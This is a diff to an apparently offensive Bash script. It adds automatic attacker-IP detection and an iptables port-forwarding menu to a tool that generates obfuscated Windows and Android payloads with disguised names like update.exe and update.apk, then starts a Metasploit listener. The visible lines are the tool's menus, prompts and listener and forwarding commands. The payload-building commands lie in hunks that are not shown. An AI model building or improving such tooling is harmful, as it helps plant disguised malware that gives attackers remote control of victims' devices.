@@ -4,7 +4,7 @@ echo -e "\e[91m"
 echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
 echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
 echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░"
-echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓████████▓▒░▒▓████████▓▒░"
+echo "░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░░▒▓████████▓▒░▒▓████████▓▒░"
 echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
 echo "░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░    ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
 echo "░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░     ░▒▓█▓▒░ ░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░"
@@ -15,15 +15,22 @@ if [[ $EUID -ne 0 ]]; then
     echo -e "\e[91m[-] This script must be run as root!\e[0m"
     exit 1
 fi
+
+# Get the local IP address
+LHOST=$(hostname -I | awk '{print $1}')
+
+# Main Menu
 echo "[1] Devices (Windows/Android)"
 echo "[2] Post-Exploitation"
-read -p "Select an option (1-2): " MAIN_OPTION
+echo "[3] Port Forwarding"
+read -p "Select an option (1-3): " MAIN_OPTION
+
+# Devices Menu
 if [[ $MAIN_OPTION -eq 1 ]]; then
     echo "[1] Windows"
     echo "[2] Android"
     read -p "Select a device type (1 or 2): " DEVICE_TYPE
     if [[ $DEVICE_TYPE -eq 1 ]]; then
-        read -p "Enter LHOST (Attacker IP): " LHOST
         read -p "Enter LPORT (Listening Port): " LPORT
         read -p "Enter the output payload name (e.g., update.exe): " PAYLOAD_NAME
         echo "[+] Generating Windows payload with obfuscation..."
@@ -72,7 +79,6 @@ EOF
         echo "[+] Starting Metasploit Listener..."
         msfconsole -r listener.rc
     elif [[ $DEVICE_TYPE -eq 2 ]]; then
-        read -p "Enter LHOST (Attacker IP): " LHOST
         read -p "Enter LPORT (Listening Port): " LPORT
         read -p "Enter the output APK name (e.g., update.apk): " PAYLOAD_NAME
         echo "[+] Generating Android payload with obfuscation..."
@@ -155,6 +161,17 @@ EOF
         echo "[-] Invalid option!"
         exit 1
     fi
+elif [[ $MAIN_OPTION -eq 3 ]]; then
+    read -p "Enter the port or ports to forward (comma-separated, e.g., 8080,443): " FORWARD_PORTS
+    IFS=',' read -r -a PORTS <<< "$FORWARD_PORTS"
+    echo "[+] Forwarding the following ports: ${PORTS[@]}"
+    for PORT in "${PORTS[@]}"; do
+        echo "[+] Forwarding port $PORT..."
+        # Assuming you're using iptables or a similar firewall tool
+        iptables -t nat -A PREROUTING -p tcp --dport $PORT -j DNAT --to-destination $LHOST:$PORT
+        iptables -t nat -A POSTROUTING -p tcp --dport $PORT -j MASQUERADE
+    done
+    echo "[+] Ports have been forwarded. You can now access services at $LHOST."
 else
     echo "[-] Invalid option!"
     exit 1
